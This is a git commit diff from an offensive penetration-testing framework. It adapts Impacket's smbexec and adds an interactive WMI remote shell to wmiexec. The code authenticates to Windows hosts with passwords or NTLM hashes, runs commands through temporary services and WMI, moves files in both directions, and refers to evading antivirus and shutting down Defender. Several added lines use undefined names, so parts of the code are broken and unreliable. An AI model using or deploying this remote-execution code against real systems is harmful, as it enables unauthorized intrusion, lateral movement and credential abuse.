cbb8e6f0a03e76182cbb6a499d71e3f867ff11c8
awsm <ryan.preston.01@gmail.com>
2019-08-28 16:54:09 -0500

    .

--- cmx/protocols/smb/smbexec.py
+++ cmx/protocols/smb/smbexec.py
@@ -1,7 +1,38 @@
 
-# 
-# https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
+# taken from: https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
+
+# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
 #
+# This software is provided under under a slightly modified version
+# of the Apache Software License. See the accompanying LICENSE file
+# for more information.
+#
+# A similar approach to psexec w/o using RemComSvc. The technique is described here
+# https://www.optiv.com/blog/owning-computers-without-shell-access
+# Our implementation goes one step further, instantiating a local smbserver to receive the 
+# output of the commands. This is useful in the situation where the target machine does NOT
+# have a writeable share available.
+# Keep in mind that, although this technique might help avoiding AVs, there are a lot of 
+# event logs generated and you can't expect executing tasks that will last long since Windows 
+# will kill the process since it's not responding as a Windows service. 
+# Certainly not a stealthy way.
+#
+# This script works in two ways:
+# 1) share mode: you specify a share, and everything is done through that share.
+# 2) server mode: if for any reason there's no share available, this script will launch a local
+#    SMB server, so the output of the commands executed are sent back by the target machine
+#    into a locally shared folder. Keep in mind you would need root access to bind to port 445 
+#    in the local machine.
+# 
+# Author:
+#  beto (@agsolino)
+#
+# Reference for:
+#  DCE/RPC and SMB.
+#
+# Customized by @awsmhacks for CMX
+
+
 
 import logging
 import os
@@ -22,7 +53,9 @@ DUMMY_SHARE     = 'TMP'
 
 class SMBEXEC:
 
-    def __init__(self, host, share_name, protocol, username = '', password = '', domain = '', hashes = None, share = None, port=445):
+    def __init__(self, host, share_name, protocol, username = '', password = '',
+                 domain = '', hashes = None, share = None, port=445):
+
         self.__host = host
         self.__share_name = share_name
         self.__port = port
@@ -41,7 +74,7 @@ class SMBEXEC:
         self.__rpctransport = None
         self.__scmr = None
         self.__conn = None
-        self.__mode  = 'SHARE'  # need to figure out the smbserver_dir(ectory) that we can always write too
+        self.__mode  = 'SHARE'  
         #self.__aesKey = aesKey
         #self.__doKerberos = doKerberos
 
@@ -69,7 +102,8 @@ class SMBEXEC:
 
         if hasattr(self.__rpctransport, 'set_credentials'):
             # This method exists only for selected protocol sequences.
-            self.__rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+            self.__rpctransport.set_credentials(self.__username, self.__password, self.__domain,
+                                                self.__lmhash, self.__nthash)
         #rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
 
         self.__scmr = self.__rpctransport.get_dce_rpc()
@@ -114,7 +148,7 @@ class SMBEXEC:
 
         command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__batchFile)
         #adding creds gets past systems disallowing guest-auth
-        command = self.__shell + '"net use /persistent:yes \\\\{}\\{} /user:{} {} & {} "'.format(local_ip, self.__share_name, self.__username, self.__password, command)
+        command = self.__shell + '"net use /persistent:no \\\\{}\\{} /user:{} {} & {} "'.format(local_ip, self.__share_name, self.__username, self.__password, command)
         
         logging.debug('Command to execute: ' + command)
 
@@ -131,6 +165,7 @@ class SMBEXEC:
         scmr.hRDeleteService(self.__scmr, service)
         scmr.hRCloseServiceHandle(self.__scmr, service)
         self.get_output_fileless()
+
 
     def get_output_fileless(self):
         if not self.__retOutput: return
@@ -158,6 +193,7 @@ class SMBEXEC:
            scmr.hRCloseServiceHandle(self.__scmr, service)
         except:
             pass
+
 
 #Getting shellular
     def run(self, remoteName, remoteHost):
@@ -194,7 +230,7 @@ class SMBEXEC:
 
 
 #
-#https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
+
 #
 class RemoteShell(cmd.Cmd):
     def __init__(self, share, rpc, mode, serviceName):
--- cmx/protocols/smb/wmiexec.py
+++ cmx/protocols/smb/wmiexec.py
@@ -1,4 +1,7 @@
 import ntpath, logging
+import sys
+import os
+import cmd
 
 from gevent import sleep
 from cmx.helpers.misc import gen_random_string
@@ -10,6 +13,11 @@ from impacket.dcerpc.v5.dcom import wmi
 from impacket.dcerpc.v5.dtypes import NULL
 from cmx import config as cfg
 import time
+
+OUTPUT_FILENAME = '__output'
+BATCH_FILENAME  = 'execute.bat'
+SMBSERVER_DIR   = './logs/'
+DUMMY_SHARE     = 'TMP'
 
 
 class WMIEXEC:
@@ -185,4 +193,211 @@ class WMIEXEC:
         self.__win32Process.Create(command, self.__pwd, None)
         print('            [!] Sleeping to allow defender process to finish shutting down[!] ')
         time.sleep(8)
+
+
+####################################################################################################
+####################################################################################################
+#                           Shell Stuff
+####################################################################################################
+####################################################################################################
+
+
+    def run(self, addr, dummy):
         
+        self.shell = None
+        
+        try:
+            self.shell = RemoteShell(self.__share, self.win32Process, self.smbConnection)
+            self.shell.cmdloop()
+
+        except  (Exception, KeyboardInterrupt) as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.error(str(e))
+            if smbConnection is not None:
+                smbConnection.logoff()
+            dcom.disconnect()
+            sys.stdout.flush()
+            sys.exit(1)
+
+        try:
+            if smbConnection is not None:
+                smbConnection.logoff()
+            dcom.disconnect()
+
+        except  (Exception, KeyboardInterrupt) as e:
+            logging.debug('Error: {}'.format(e))
+
+
+
+
+class RemoteShell(cmd.Cmd):
+    def __init__(self, share, win32Process, smbConnection):
+        cmd.Cmd.__init__(self)
+        self.__share = share
+        self.__output = '\\' + OUTPUT_FILENAME
+        self.__outputBuffer = str('')
+        self.__shell = 'cmd.exe /Q /c '
+        self.__win32Process = win32Process
+        self.__transferClient = smbConnection
+        self.__pwd = str('C:\\')
+        self.__noOutput = False
+        self.intro = "   .... i'm in \n Type help for extra shell commands"
+
+        # We don't wanna deal with timeouts from now on.
+        if self.__transferClient is not None:
+            self.__transferClient.setTimeout(100000)
+            self.do_cd('\\')
+        else:
+            self.__noOutput = True
+
+    def do_shell(self, s):
+        os.system(s)
+
+    def do_help(self, line):
+        print("""
+ lcd {path}                 - changes the current local directory to {path}
+ exit                       - terminates the server process (and this session)
+ put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
+ get {file}                 - downloads pathname to the current local dir 
+ ! {cmd}                    - executes a local shell cmd
+""") 
+
+    def do_lcd(self, s):
+        if s == '':
+            print(os.getcwd())
+        else:
+            try:
+                os.chdir(s)
+            except Exception as e:
+                logging.error(str(e))
+
+    def do_get(self, src_path):
+
+        try:
+            import ntpath
+            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
+            drive, tail = ntpath.splitdrive(newPath) 
+            filename = ntpath.basename(tail)
+            fh = open(filename,'wb')
+            logging.info("Downloading %s\\%s" % (drive, tail))
+            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
+            fh.close()
+
+        except Exception as e:
+            logging.error(str(e))
+
+            if os.path.exists(filename):
+                os.remove(filename)
+
+
+
+    def do_put(self, s):
+        try:
+            params = s.split(' ')
+            if len(params) > 1:
+                src_path = params[0]
+                dst_path = params[1]
+            elif len(params) == 1:
+                src_path = params[0]
+                dst_path = ''
+
+            src_file = os.path.basename(src_path)
+            fh = open(src_path, 'rb')
+            dst_path = dst_path.replace('/','\\')
+            import ntpath
+            pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
+            drive, tail = ntpath.splitdrive(pathname)
+            logging.info("Uploading %s to %s" % (src_file, pathname))
+            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
+            fh.close()
+        except Exception as e:
+            logging.critical(str(e))
+            pass
+
+    def do_exit(self, s):
+        return True
+
+    def emptyline(self):
+        return False
+
+    def do_cd(self, s):
+        self.execute_remote('cd ' + s)
+        if len(self.__outputBuffer.strip('\r\n')) > 0:
+            print(self.__outputBuffer)
+            self.__outputBuffer = ''
+        else:
+            if PY2:
+                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
+            else:
+                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
+            self.execute_remote('cd ')
+            self.__pwd = self.__outputBuffer.strip('\r\n')
+            self.prompt = (self.__pwd + '>')
+            self.__outputBuffer = ''
+
+    def default(self, line):
+        # Let's try to guess if the user is trying to change drive
+        if len(line) == 2 and line[1] == ':':
+            # Execute the command and see if the drive is valid
+            self.execute_remote(line)
+            if len(self.__outputBuffer.strip('\r\n')) > 0: 
+                # Something went wrong
+                print(self.__outputBuffer)
+                self.__outputBuffer = ''
+            else:
+                # Drive valid, now we should get the current path
+                self.__pwd = line
+                self.execute_remote('cd ')
+                self.__pwd = self.__outputBuffer.strip('\r\n')
+                self.prompt = (self.__pwd + '>')
+                self.__outputBuffer = ''
+        else:
+            if line != '':
+                self.send_data(line)
+
+    def get_output(self):
+        def output_callback(data):
+            try:
+                self.__outputBuffer += data.decode(CODEC)
+            except UnicodeDecodeError:
+                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
+                              'https://docs.python.org/2.4/lib/standard-encodings.html\nand then execute wmiexec.py '
+                              'again with -codec and the corresponding codec')
+                self.__outputBuffer += data.decode(CODEC, errors='replace')
+
+        if self.__noOutput is True:
+            self.__outputBuffer = ''
+            return
+
+        while True:
+            try:
+                self.__transferClient.getFile(self.__share, self.__output, output_callback)
+                break
+            except Exception as e:
+                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
+                    # Output not finished, let's wait
+                    time.sleep(1)
+                    pass
+                elif str(e).find('Broken') >= 0:
+                    # The SMB Connection might have timed out, let's try reconnecting
+                    logging.debug('Connection broken, trying to recreate it')
+                    self.__transferClient.reconnect()
+                    return self.get_output()
+        self.__transferClient.deleteFile(self.__share, self.__output)
+
+    def execute_remote(self, data):
+        command = self.__shell + data 
+        if self.__noOutput is False:
+            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
+        if PY2:
+            self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
+        else:
+            self.__win32Process.Create(command, self.__pwd, None)
+        self.get_output()
+
+    def send_data(self, data):
+        self.execute_remote(data)
+        print(self.__outputBuffer)
+        self.__outputBuffer = ''
